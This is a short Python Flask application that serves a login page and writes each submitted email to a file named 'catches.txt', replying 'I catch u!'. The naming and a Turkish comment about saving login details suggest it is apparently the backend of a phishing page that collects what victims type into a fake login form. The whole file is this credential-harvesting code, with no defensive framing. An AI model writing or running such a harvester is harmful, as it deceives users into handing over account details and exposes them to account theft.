from flask import Flask, render_template, request, jsonify
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    
    # Giriş bilgilerini catches.txt dosyasına kaydet
    with open('catches.txt', 'a', encoding='utf-8') as f:
        f.write(f"Email: {email}\n")
        f.write("-" * 50 + "\n")
    
    return jsonify({"message": "I catch u!"})

if __name__ == '__main__':
    app.run(debug=True)
